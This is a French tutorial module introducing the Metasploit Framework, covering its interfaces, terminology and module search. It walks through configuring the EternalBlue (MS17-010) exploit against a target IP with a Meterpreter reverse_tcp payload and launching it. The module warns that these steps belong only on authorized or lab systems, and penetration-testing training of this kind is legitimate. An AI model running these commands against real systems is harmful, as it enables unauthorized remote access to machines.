# 💥 Module 4 : Introduction à Metasploit Framework (MSF)

Metasploit est un framework d'évaluation de sécurité et d'audit offensif (*pentesting*). Conçu à l'origine en 2003 par HD Moore et repris par Rapid7 en 2009, il offre un écosystème modulaire permettant d'automatiser la reconnaissance, la validation de vulnérabilités et l'exploitation de systèmes distants.

---
> ⚠️ **Avertissement**
>
> Les exemples de scan, de reconnaissance et de connexion à des services doivent être exécutés uniquement sur des systèmes que vous possédez ou pour lesquels vous avez une autorisation explicite.
> Pour les démonstrations de cybersécurité, privilégiez un environnement de laboratoire isolé.

### Principales versions

- **Metasploit Framework (MSF) :** Version open-source en ligne de commande, maintenue par la communauté et Rapid7. C'est l'outil de référence utilisé sur Kali Linux.

- **Metasploit Pro :** Solution d'entreprise commerciale proposant une interface web, des fonctionnalités avancées d'automatisation, des tests d'ingénierie sociale (phishing) et des rapports d'audit complets.

---

## 2. Interfaces disponibles

Metasploit propose plusieurs points d'entrée selon les besoins opérationnels :

- **`msfconsole` :** L'interface interactive principale en CLI. C'est la plus stable, documentée et flexible.
- **Mode direct en ligne de commande (`-x`) :** Idéal pour automatiser des actions ou lancer des scripts sans entrer en session interactive :
  ```bash
  msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.50; run; exit"
  ```
- **Interfaces graphiques :** Historiquement `msfgui`, ou encore **Armitage** (outil tiers) et l'interface Web de Metasploit Pro.

### Commandes d'aide utiles

```bash
# Obtenir les options du binaire msfconsole depuis le terminal
msfconsole -h

# Obtenir l'aide générale dans msfconsole
msf6 > help

# Obtenir l'aide spécifique sur une commande précise
msf6 > help search
msf6 > help set
```

---

## 3. Terminologie fondamentale

| Concept | Définition |
| :--- | :--- |
| **Exploit** | Programme ou séquence de code tirant parti d'une faiblesse ou d'un bug (buffer overflow, mauvaise validation, injection) pour altérer le comportement normal d'un logiciel. |
| **Auxiliary** | Module sans payload d'accès final. Utilisé pour les scans réseau, le sniffing, l'énumération de services, ou encore les attaques par force brute. |
| **Payload** | Code exécuté sur le système cible après la réussite de l'exploit (shell inverse, session Meterpreter, création de compte, etc.). |
| **Post** | Modules de post-exploitation exécutés une fois la cible compromise (pivotement, dump de credentials, énumération locale). |
| **Encoder / NOP** | Outils servant à masquer les signatures des payloads ou à insérer des instructions neutres pour ajuster l'alignement mémoire. |

---

## 4. Recherche de modules

### A. Recherche locale dans le système de fichiers Linux

Les modules de Metasploit sont des scripts Ruby stockés par défaut dans `/usr/share/metasploit-framework/modules/`.

```bash
# Recherche rapide par mot-clé avec locate
locate exploits | grep vsftpd

# Recherche ciblée avec find
find /usr/share/metasploit-framework/modules/exploits/ -name "*smb*"

# Recherche de texte ou CVE dans le code source des modules
grep -rn "MS17-010" /usr/share/metasploit-framework/modules/exploits/
```

### B. Recherche interne avec `msfconsole`

La commande `search` inclut des filtres précis pour restreindre les résultats :

```bash
# Recherche générale par nom ou service
msf6 > search vsftpd

# Recherche par identifiant CVE
msf6 > search cve:2017-0144

# Recherche combinée avec filtres (type, plateforme, réputation)
msf6 > search type:exploit platform:windows name:smb rank:excellent
```

---

## 5. Utilisation et configuration d'un module

Le déroulement standard d'une action dans Metasploit suit 5 étapes :

### 1. Sélectionner le module
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Afficher les options requises
```bash
msf6 exploit(...) > show options
```

### 3. Configurer les variables d'environnement
```bash
# Définir l'adresse de la cible (victime)
msf6 exploit(...) > set RHOSTS 192.168.1.105

# Définir l'adresse locale (machine d'attaque / listener)
msf6 exploit(...) > set LHOST 192.168.1.10
```

### 4. Choisir et configurer le payload (optionnel si un défaut est déjà actif)
```bash
msf6 exploit(...) > show payloads
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LPORT 4444
```

### 5. Exécuter l'attaque
```bash
# Déclencher le module (run et exploit sont équivalents)
msf6 exploit(...) > exploit
```

---

## 6. Variables courantes à retenir

| Variable | Description |
| :--- | :--- |
| **`RHOSTS`** | *Remote Host(s)* : IP unique, liste d'IP ou sous-réseau CIDR de la cible. |
| **`RPORT`** | *Remote Port* : Port d'écoute du service distant ciblé. |
| **`LHOST`** | *Local Host* : Adresse IP de l'attaquant qui reçoit la connexion inverse. |
| **`LPORT`** | *Local Port* : Port local d'écoute configuré sur la machine attaquante. |
| **`PAYLOAD`** | Identifiant de la charge utile chargée en mémoire lors de l'exploitation. |